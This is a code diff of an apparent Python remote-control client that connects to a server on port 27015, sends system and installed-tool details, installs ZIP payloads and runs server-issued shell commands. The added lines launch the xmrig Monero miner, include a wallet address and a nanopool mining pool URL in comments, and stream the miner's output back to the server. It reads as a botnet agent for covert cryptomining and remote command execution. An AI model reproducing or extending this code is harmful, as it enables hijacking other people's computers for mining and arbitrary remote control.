@@ -31,16 +31,21 @@ def xor_encrypt_decrypt(data):
     for i in range(len(data)):
         data[i] ^= xorKey[i % len(xorKey)]
     return data
-# Function to read and send process output
-def read_output(process, output_queue):
-    for line in iter(process.stdout.readline, ''):
-        output_queue.put(line.strip())
 
-# Asynchronous function to send output to the server
-async def send_output(output_queue, websocket):
+def read_output(process, output_queue):
+    for line in process.stdout:
+        output_queue.put(line)
+    for line in process.stderr:
+        output_queue.put(line)
+    output_queue.put(None)  # Signal that the process output is complete
+    
+async def send_output(client_socket, reader):
     while True:
-        output_line = output_queue.get()
-        await websocket.send(output_line)
+        line = await reader.readline()
+        print(line)
+        if not line:
+            break
+        client_socket.send(line)
 
 async def main():
     installed_tools_list = system_info.installed_tools()
@@ -52,6 +57,7 @@ async def main():
             # Initialize Winsock
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((ip, 27015))
+            
 
             print("Connected to server.")
 
@@ -73,8 +79,6 @@ async def main():
                     "system": system_info.get_system_info(),
                     "installed_tools": installed_tools_list
                 }).encode()
-
-                
 
                 client_socket.send(data_json)
             else:
@@ -122,16 +126,14 @@ async def main():
                                 except Exception as e:
                                     installation_output = f"Error during installation: {str(e)}"
                             else:
-                                installation_output = "Error during installation: File is not a valid ZIP file." 
-        
+                                installation_output = "Error during installation: File is not a valid ZIP file."
 
                             startInstalling = False
                             print(installation_output)
                             modified_output = "s#0&\n" + installation_output + "s#1&\n"
                             
                             client_socket.send(modified_output.encode())
-                        
-                          
+
                         else:
                             accumulated_data += recv_buf
                             # print(f"{os.getcwd()}\\{app_path}")
@@ -145,34 +147,92 @@ async def main():
                   
                     elif recv_buf.decode().startswith("stream::"):
                         recv_buf = recv_buf.decode()[len("stream::"):]
-                        if (recv_buf.startswith("monero/xmrig.exe")):            
+                        if (recv_buf.startswith(".\\monero\\xmrig.exe")):            
                             # Execute the command and capture its output in a log file
                             log_file_path = "xmrig_output.log"
 
-                            # Execute the command and capture its output
-                            process = subprocess.Popen(
+##### 48X8EC2znPa6EXyqzN1zM1uyPqQZ9uJ6G88yXtZoKm12F18fFdRC8Ah5oF63v4NaR5CrnXqHgyh73T5o6Kn2xvsmDxXKaJw
+##### stratum+tcp://xmr-asia1.nanopool.org:10300
+                            print("start excuction")
+                            process = await asyncio.create_subprocess_shell(
                                 recv_buf,
-                                shell=True,
-                                stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE,
-                                text=True,
-                                bufsize=1,  # Line-buffered
-                                universal_newlines=True,
+                                stdout=asyncio.subprocess.PIPE,
+                                stderr=asyncio.subprocess.PIPE
                             )
 
-                            # Use a queue to store output lines
-                            output_queue = queue.Queue()
+                            print("send outputs")
+                            # Create tasks to send stdout and stderr to the server
+                            stdout_task = asyncio.create_task(send_output(client_socket, process.stdout))
+                            stderr_task = asyncio.create_task(send_output(client_socket, process.stderr))
 
-                            # Start a thread to read output
-                            output_thread = threading.Thread(target=read_output, args=(process, output_queue))
-                            output_thread.daemon = True
-                            output_thread.start()
+                            asyncio.gather(stdout_task, stderr_task)
+                            # await process.wait()
+                            print("wait to receve concelation")
 
-                            # Asynchronously send output to the server
-                            await asyncio.gather(
-                                send_output(output_queue, client_socket),
-                                process.wait()  # Wait for the process to complete
-                            )
+                            # async with asyncio.TaskGroup() as tg:
+                            #     task1 = tg.create_task(cancel_process())
+                            #     task2 = tg.create_task(when_prossed_done())
+                            async def when_prossed_done():
+                                return_code = await process.wait()
+                                client_socket.send(f"{return_code}s#1&".encode())
+                                client_socket.send("sTop#0&".encode())
+                                return
+
+                            async def cancel_process(): 
+                                while True:
+                                    recved_bufer = await asyncio.to_thread(client_socket.recv, 1024)
+                                    print("receve stop sign")
+                                    # recved_bufer = client_socket.recv(1024)
+                                    print(recved_bufer)
+                                    if recved_bufer:
+                                        if recved_bufer.decode() == "stream::endTask#0&":
+                                            print("Cancel Task Monero")
+                                            stderr_task.cancel()
+                                            stdout_task.cancel()
+                                            process.terminate()
+                                            client_socket.send("sTop#0&".encode())
+                                            return
+                                        
+                            await asyncio.gather(when_prossed_done(), cancel_process())
+
+                     
+                                            
+                                        
+
+                                
+
+
+
+
+
+                          # Execute the command and capture its output
+                            # process = await asyncio.create_subprocess_shell(
+                            #     recv_buf,
+                            #     stdout=subprocess.PIPE,
+                            #     stderr=subprocess.PIPE
+                            # )
+                            # process = subprocess.Popen(
+                            #     recv_buf,
+                            #     shell=True,
+                            #     stdout=subprocess.PIPE,
+                            #     stderr=subprocess.PIPE,
+                            #     text=True,
+                            #     bufsize=1,  # Line-buffered
+                            #     universal_newlines=True,
+                            # )
+                            # print("start excuction")
+                            
+                            # # Create tasks to send stdout and stderr to the server
+                            # tasks = [
+                            #     process.wait(),
+                            #     send_output(client_socket, process.stdout),
+                            #     send_output(client_socket, process.stderr),
+                            # ]
+
+                            # Wait for the process to complete and all output to be sent
+                            # await asyncio.wait(tasks)
+                            # await process.wait()
+
                             print("Command execution complete")
                         else:
                             print(recv_buf)
@@ -187,6 +247,8 @@ async def main():
                                 universal_newlines=True,
                             )
 
+                            process.wait()
+
                             # Continuously read and process the output
                             for line in process.stdout:
                                 print(line)
@@ -194,7 +256,6 @@ async def main():
 
                             print("start Excuting")
                             # Wait for the process to complete
-                            process.wait()
                             client_socket.send("sTop#0&".encode())
                             print("End Excuting")
 
